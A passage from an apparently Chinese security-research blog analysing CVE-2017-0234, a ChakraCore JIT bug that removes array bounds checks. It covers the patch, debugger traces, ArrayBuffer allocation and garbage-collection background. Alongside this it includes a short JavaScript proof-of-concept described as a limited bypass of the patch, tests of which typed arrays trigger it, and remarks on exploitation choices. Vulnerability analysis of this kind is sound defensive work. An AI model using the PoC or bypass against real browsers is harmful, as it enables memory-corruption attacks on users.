src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg" alt=""></p></li></ul><h4 id="关于patch的思考"><a href="#关于patch的思考" class="headerlink" title="关于patch的思考"></a>关于patch的思考</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br></pre></td></tr></table></figure><p>要绕过patch再次触发就要进入这个if body，(static_cast<uint64>(upperBound) &lt;&lt; indirScale)的限制是要小于4GB，这应该和内存分配有关。<br><code>var buffer = new ArrayBuffer(0x10000);</code><br>能否在进入if body的同时，又能OOB超出数组长度，就是后面需要思考的问题。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IntConstantBounds idxConstantBounds;</span><br><span class="line">                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">                    &#123;</span><br><span class="line">                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">                        int32 upperBound = idxConstantBounds.LowerBound();</span><br></pre></td></tr></table></figure></uint64></p><p>该段代码表示了程序试图获取ConstantBounds来赋值给idxConstantBounds从而控制upperBound&amp;lowerBound<br>因此PoC中需要构造常数边界来控制upperBound&amp;upperBound从而控制下列判断：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//回溯分析</span><br><span class="line">//rax = idxOpnd</span><br><span class="line">//if (idxOpnd) </span><br><span class="line">//idxSym = idxOpnd-&gt;m_sym;</span><br><span class="line">        //&#123;</span><br><span class="line">                    //test rax,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rax+8]</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rcx,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //StackSym::GetTypeEquivSym(IRType type, Func *func)</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rcx+30h]</span><br><span class="line">        //&#125;</span><br><span class="line">//Value * idxValue = FindValue(idxSym); //rax</span><br><span class="line">//IntConstantBounds idxConstantBounds; //rax</span><br><span class="line">//if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds)) //rax</span><br></pre></td></tr></table></figure><p>经过测试，在patch了的函数那里下断，跟进到这个if判断,得到有限制的bypass patch PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">j,number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++) <span class="comment">//create jit code</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=<span class="number">0x6000000</span>) view[j]=number;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x1234</span>,<span class="number">1</span>) <span class="comment">//jit create</span></span><br><span class="line">write(<span class="number">0x123456</span>,<span class="number">1</span>) <span class="comment">//bypass(limited) patch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov     r8,qword ptr [rbp-78h]= 0600000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//R8  = 06000000 00000000</span></span><br><span class="line"><span class="comment">//       high      low</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//test        r8d,r8d   r8d=0</span></span><br><span class="line"><span class="comment">//shr         r8,20h    r8=0x0000000006000000</span></span><br><span class="line"><span class="comment">//movsxd      rdx,r8d   rdx=0x06000000</span></span><br><span class="line"><span class="comment">//movzx       ecx,al    al=2</span></span><br><span class="line"><span class="comment">//shl         rdx,cl </span></span><br><span class="line"><span class="comment">//mov         rax,100000000h </span></span><br><span class="line"><span class="comment">//cmp         rdx,rax</span></span><br></pre></td></tr></table></figure></p><h3 id="更多的思考"><a href="#更多的思考" class="headerlink" title="更多的思考"></a>更多的思考</h3><p><del>chakra为什么这么优化，它涉及怎样的一个pattern，这样优化和buffer相关的点有哪些？</del></p><ol><li>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）</li><li>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?</li></ul><h3 id="JIT优化-amp-amp-内存分配"><a href="#JIT优化-amp-amp-内存分配" class="headerlink" title="JIT优化&amp;&amp;内存分配"></a>JIT优化&amp;&amp;内存分配</h3><p>经过进一步对内存分配的调试（首先我在windbg里对windows API下断,参考了<a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/" target="_blank" rel="noopener">这篇</a>，然后回溯确实跟到了VirtualAlloc，不过和我找的不是同一个。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp KERNEL32!VirtualAllocStub</span><br><span class="line">0:000&gt; g</span><br><span class="line">ModLoad: 00007ffc`0e250000 00007ffc`0fc52000   D:\chakracore\ChakraCore\Build\VcBuild\bin\x64_debug\chakracore.dll</span><br><span class="line">ModLoad: 00007ffc`55f90000 00007ffc`560d5000   C:\windows\System32\ole32.dll</span><br><span class="line">ModLoad: 00007ffc`54030000 00007ffc`54057000   C:\windows\System32\GDI32.dll</span><br><span class="line">ModLoad: 00007ffc`529c0000 00007ffc`52b47000   C:\windows\System32\gdi32full.dll</span><br><span class="line">ModLoad: 00007ffc`53780000 00007ffc`538ca000   C:\windows\System32\USER32.dll</span><br><span class="line">ModLoad: 00007ffc`529a0000 00007ffc`529be000   C:\windows\System32\win32u.dll</span><br><span class="line">ModLoad: 00007ffc`53f10000 00007ffc`53f69000   C:\windows\System32\sechost.dll</span><br><span class="line">ModLoad: 00007ffc`53b90000 00007ffc`53c31000   C:\windows\System32\ADVAPI32.dll</span><br><span class="line">ModLoad: 00007ffc`406c0000 00007ffc`40869000   C:\windows\SYSTEM32\dbghelp.dll</span><br><span class="line">ModLoad: 00007ffc`40b50000 00007ffc`40b79000   C:\windows\SYSTEM32\dbgcore.DLL</span><br><span class="line">ModLoad: 00007ffc`54190000 00007ffc`541bd000   C:\windows\System32\IMM32.DLL</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">KERNEL32!VirtualAllocStub:</span><br><span class="line">00007ffc`53f99800 48ff2569c60500  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffc`53ff5e70)] ds:00007ffc`53ff5e70=&#123;KERNELBASE!VirtualAlloc (00007ffc`532aafc0)&#125;</span><br><span class="line">…</span><br><span class="line">0:000&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 00000030`208fec08 00007ffc`0e34bfe2 KERNEL32!VirtualAllocStub</span><br><span class="line">01 00000030`208fec10 00007ffc`0e252610 chakracore!Memory::X64WriteBarrierCardTableManager::Initialize+0x82 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 232] </span><br><span class="line">02 00000030`208fec70 00007ffc`0f0e647d chakracore!`dynamic initializer for &apos;Memory::RecyclerWriteBarrierManager::cardTable&apos;&apos;+0x10 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 29] </span><br><span class="line">03 00000030`208feca0 00007ffc`0f0641bd chakracore!_initterm+0x5d [d:\th\minkernel\crts\ucrt\src\appcrt\startup\initterm.cpp @ 22] </span><br><span class="line">04 00000030`208fece0 00007ffc`0f0640b7 chakracore!dllmain_crt_process_attach+0xbd [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 67] </span><br><span class="line">05 00000030`208fed30 00007ffc`0f064345 chakracore!dllmain_crt_dispatch+0x47 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 133] </span><br><span class="line">06 00000030`208fed70 00007ffc`0f0644c1 chakracore!dllmain_dispatch+0x75 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 190] </span><br><span class="line">07 00000030`208fedc0 00007ffc`5622485f chakracore!_DllMainCRTStartup+0x31 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 249] </span><br><span class="line">08 00000030`208fedf0 00007ffc`5624d762 ntdll!LdrpCallInitRoutine+0x6b</span><br><span class="line">09 00000030`208fee60 00007ffc`5624d5ab ntdll!LdrpInitializeNode+0x15a</span><br><span class="line">0a 00000030`208fef80 00007ffc`56247045 ntdll!LdrpInitializeGraphRecurse+0x73</span><br><span class="line">0b 00000030`208fefc0 00007ffc`5621d690 ntdll!LdrpPrepareModuleForExecution+0xc5</span><br><span class="line">0c 00000030`208ff000 00007ffc`5621d273 ntdll!LdrpLoadDllInternal+0x1a4</span><br><span class="line">0d 00000030`208ff080 00007ffc`5621c3cc ntdll!LdrpLoadDll+0x107</span><br><span class="line">0e 00000030`208ff220 00007ffc`5328eb02 ntdll!LdrLoadDll+0x8c</span><br><span class="line">0f 00000030`208ff320 00007ffc`532ba6d1 KERNELBASE!LoadLibraryExW+0x152</span><br><span class="line">10 00000030`208ff390 00007ff6`ee0d5509 KERNELBASE!LoadLibraryExA+0x31</span><br><span class="line">11 00000030`208ff3d0 00007ff6`ee0d55e9 CH!LoadChakraCore+0x19 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 38] </span><br><span class="line">12 00000030`208ff400 00007ff6`ee0d51ac CH!ChakraRTInterface::LoadChakraDll+0xd9 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 67] </span><br><span class="line">13 00000030`208ff7b0 00007ff6`ee0efee4 CH!wmain+0x61c [d:\chakracore\chakracore\bin\ch\ch.cpp @ 942] </span><br><span class="line">14 00000030`208ff910 00007ff6`ee0efdf7 CH!invoke_main+0x34 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 80] </span><br><span class="line">15 00000030`208ff950 00007ff6`ee0efcbe CH!__scrt_common_main_seh+0x127 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 253] </span><br><span class="line">16 00000030`208ff9b0 00007ff6`ee0efef9 CH!__scrt_common_main+0xe [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 296] </span><br><span class="line">17 00000030`208ff9e0 00007ffc`53f92784 CH!wmainCRTStartup+0x9 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17] </span><br><span class="line">18 00000030`208ffa10 00007ffc`56270d51 KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">19 00000030`208ffa40 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span><br></pre></td></tr></table></figure></p><p>于是全局搜索MEM_COMMIT，在ArrayBuffer.h里找到线索，并调试确认。<br>结论如下：<br>在为ArrayBuffer进行内存分配时，会对长度有一个判断。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg" alt=""><br>并根据这个判断的返回结果，决定使用Virtual Alloc（AllocWrapper是一个包装）还是malloc来分配内存。<br>这主要是根据length的长度和”标志位“。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032100.jpg" alt=""><br>如果是用Virtual Alloc分配(关于这种分配方式的参数，可以参考<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85" target="_blank" rel="noopener">MSDN</a>.aspx))<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg" alt=""><br>那么为ArrayBuffer分配的保留空间大小为4GB<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032430.jpg" alt=""><br>随后COMMIT真正使用的大小，也就是PoC里的0x10000<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg" alt=""></p><p>JIT在优化的时候会因为我们给这个Buffer分配的内存足够大（4GB），就去掉了边界检查，但其实这是一个安全隐患。</p><h3 id="Pattern匹配"><a href="#Pattern匹配" class="headerlink" title="Pattern匹配"></a>Pattern匹配</h3><p>我尝试着替换ArrayBuffer，寻找和此处bug逻辑相似的地方，在源码里搜索，不过暂时没有找到疑似的地方。</p><h3 id="触发条件-修改PoC"><a href="#触发条件-修改PoC" class="headerlink" title="触发条件(修改PoC)"></a>触发条件(修改PoC)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">         !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">         ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">           baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">           !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">         )</span><br><span class="line">        )</span><br><span class="line">     &#123;</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol><li>替换控制ArrayBuffer的对象</li><li>测试case</li></ol><h4 id="TypeView"><a href="#TypeView" class="headerlink" title="TypeView"></a>TypeView</h4><p>PoC里用的是Uint32Array，其实TypedView只要宽度大于一个字节都是可以的<br>下面这些都测试成功。（其实主要常用的写exp的还是FloatArray）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Uint8Array();-</span><br><span class="line">Uint16Array();+</span><br><span class="line">Uint32Array();+</span><br><span class="line"></span><br><span class="line">Int8Array();-</span><br><span class="line">Int16Array();+</span><br><span class="line">Int32Array();+</span><br><span class="line"></span><br><span class="line">Float32Array();+</span><br><span class="line">Float64Array();+</span><br></pre></td></tr></table></figure></p><h4 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h4><ul><li>JSObject<ul><li>JSArray<ul><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li></ul></li></ul></li></ul><p>ArrayBuffer需要用TypedArray或DataView来实际访问。<br>而为了Exploit，最好不要做多余的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br>不过我这里还是测试了一下DataView，没有成功。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step)</span><br><span class="line">     view.setInt32(i,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ /d/chakracore/ChakraCore/Build/VcBuild/bin/x64_debug/ch.exe test3.js</span><br><span class="line">TypeError: DataView operation access beyond specified buffer length</span><br><span class="line">   at write (d:\cve-2017-0234\test3.js:3:6)</span><br><span class="line">   at Global code (d:\cve-2017-0234\test3.js:9:1)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg" alt=""><br>全局搜索报错字符串并查找引用寻找原因。<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg" alt=""></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在patch后，要触发需要构造常数边界(上面有分析)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">            !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">            ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">              baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">              !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p><p>isProfilableStElem显然是JIT优化时用来采集的一个标志，所以通过循环生成JIT的时候就可以走进if body。<br>但是其他和IR有关的“||”选项显然是不能放过的线索，可以测试如何走进这些路径。</p><h3 id="开发者的assumption"><a href="#开发者的assumption" class="headerlink" title="开发者的assumption"></a>开发者的assumption</h3><h4 id="assumption"><a href="#assumption" class="headerlink" title="assumption"></a>assumption</h4><p>如图可知，传入的length的最大长度为MaxArrayBufferLength，length的类型是uint32即最大值2^32-1<br>MaxArrayBufferLength    0x7fffffff    const unsigned int<br>这里即是对要分配的buffer的空间大小的一次校验。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg" alt=""></p><p>而采用VirtualAlloc一次分配的大小是4GB即2^32<br><code>#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031827.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg" alt=""><br>然而在通过索引访问buffer的时候，索引的类型也是uint32的。<br>于是若是数组索引，按照单个元素size同比扩容之后，则有可能超过4GB的虚拟内存（即length最大可以申请到4G，但是访问可以是4G*x）。<br>而对于访问超过分配的buffer但是在VirtualAlloc分配的4G内的越界读写会直接会由硬件进行捕获。<br>我推测开发者在写代码的时候，正是没有注意到这一点，于是只是简单的出于性能优化的考虑，错误的判断了索引无论如何都不可能超出保留的大空间越界访问（因为4G是“最大”了，而在4G内的越界访问都会被硬件捕获并终止）<br>于是就直接去掉了边界。 </p><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><p>最简单也是最常见的可优化边界检查代码就是处在循环里的边界检查。</p><p>我们假设循环具有迭代变量i，且初值为init, 终值为fin，i++<br>只有循环控制代码修改i<br>假设必须要满足的范围是<code>lo &lt; i &lt; hi</code><br>本来循环应该是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    if i &lt; lo trap</span><br><span class="line">    if i &gt; hi trap</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;=hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= fin goto L1</span><br></pre></td></tr></table></figure></p><p>最容易处理的情况是i为常量v，则只需要将检查lo &lt; i &lt; hi的代码外提到循环的前置块里即可</p><p>下一种稍微复杂一点的情况是i为变量，这样我们就要处理范围表达式lo &lt; i &lt; hi（比如说分配的数组最大空间不超过hi，最小不小于0）<br>其中i是循环控制变量，在这种情况下，只需要lo &lt; init且 fin &lt; hi ， 就能满足范围表达式<br>于是我们可以这么做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    if lo &gt; init trap (i的初始值为init，如果init 比 i需满足的最小值还小，则trap</span><br><span class="line">    t1 &lt;- min(fin, hi)</span><br><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;= hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= t1 goto L1</span><br><span class="line">    if i &lt;= fin trap 6(i本应该到达fin，如果i不能到达它本来应该到达的值，就trap</span><br></pre></td></tr></table></figure></p><h3 id="GC和VirtualAlloc在安全性上的区别"><a href="#GC和VirtualAlloc在安全性上的区别" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>UAF(Use After Free)：即释放后使用。将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控</p><h4 id="MemGC"><a href="#MemGC" class="headerlink" title="MemGC"></a>MemGC</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg" alt=""><br>如图，对象A申请了一个数据块，当释放这个数据块时，若还有其他对象引用这个数据块，那么MemGC不会回收利用，其他程序无法将数据写入这个数据块，从而阻止了UAF漏洞的利用；若没有其他对象引用这个数据块，就不存在UAF漏洞了。</p><h4 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h4><p>标记清除（Mark and Sweep）是最早开发出的GC算法（1960年）。它的原理非常简单，首先从根开始将可能被引用的对象用递归的方式进行标记，然后将没有标记到的对象作为垃圾进行回收。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg" alt=""><br>图显示了标记清除算法的大致原理。<br>图中（1）部分显示了随着程序的运行而分配出一些对象的状态，一个对象可以对其他的对象进行引用。<br>图中（2）部分中，GC开始执行，<strong>从根开始对可能被引用的对象打上标记</strong>，大多数情况下，这种标记是通过对象内部的标志（Flag）来实现的。于是，被标记的对象我们把它们涂黑。<br>图中（3）部分中，被标记的对象所能够引用的对象也被打上标记。重复这一步骤的话，就可以将从根开始可能被间接引用到的对象全部打上标记。到此为止的操作，称为标记阶段（Mark phase）。<br>标记阶段完成时，被标记的对象就被视为“存活”对象。<br>图中（4）部分中，将全部对象按顺序扫描一遍，将没有被标记的对象进行回收。这一操作被称为清除阶段（Sweep phase）。<br>在扫描的同时，还需要将存活对象的标记清除掉，以便为下一次GC操作做好准备。标记清除算法的处理时间，是和存活对象数与对象总数的总和相关的。</p><h4 id="GC和VirtualAlloc在安全性上的区别-1"><a href="#GC和VirtualAlloc在安全性上的区别-1" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h4><p>VirtualAlloc是裸的内存分配释放，并没有对UAF加以缓解。<br>而通过控制ArrayBuffer的length(&gt;0x10000)，我们可以选择通过VirtualAlloc来分配内存，于是就“绕开”了GC的保护，就有可能通过UAF来完成利用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过分析Root Cause，并进一步通过对Assumption的思考，对patch的分析，相关知识由点及面的学习，并最后在脆弱性上进行考虑，找出可行的利用点，思考的深度有所提升。</p><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="Windbg常用命令"><a href="#Windbg常用命令" class="headerlink" title="Windbg常用命令"></a>Windbg常用命令</h4><ul><li>dd memory<br>打印内存</li><li>u<br>打印汇编</li><li>k<br>查看堆栈<h4 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h4></li></ul><ol><li>寻找JIT代码，定位CallLoopBody，它的参数就是JIT代码地址。</li><li>寻找生成JIT代码的地方可以考虑在Func::Codegen那里下断。</li></ol>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edge </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>firefox调试环境搭建</title>
      <link href="/2018/07/03/firefox_env/"/>
      <url>/2018/07/03/firefox_env/</url>
